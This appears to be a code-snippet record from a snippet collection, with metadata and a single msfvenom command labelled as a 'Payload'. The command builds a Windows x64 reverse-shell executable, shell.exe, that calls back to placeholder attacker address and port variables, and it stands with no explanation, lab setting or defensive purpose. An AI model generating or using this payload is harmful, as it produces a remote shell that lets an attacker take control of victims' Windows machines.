---
id: b9fc2687-1e07-4301-a1dd-740f12e65bac
type: code
language: Payload
verified: false
created_at: '2020-03-17T03:20:36.973150+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet b9fc2687

**Language**: Payload

```payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_ATTACKER_PORT -f exe -o shell.exe
```


